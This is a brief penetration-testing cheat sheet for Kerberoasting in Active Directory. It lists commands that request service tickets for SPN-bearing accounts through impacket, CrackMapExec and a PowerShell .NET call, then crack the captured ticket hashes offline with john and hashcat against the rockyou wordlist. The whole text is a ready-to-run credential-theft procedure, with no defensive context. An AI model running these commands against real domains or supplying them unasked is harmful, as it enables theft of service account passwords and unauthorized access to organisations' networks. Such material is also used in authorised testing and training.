# Find Kerberoastable accounts
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -request -outputfile kerberoast_hashes.txt

# Using CrackMapExec
crackmapexec ldap $DC -u $USER -p $PASS --kerberoasting kerberoast_hashes.txt

# Using PowerShell (if on Windows)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/COMPUTER.domain.local"

# Crack with john
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt

# Crack with hashcat (mode 13100)
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt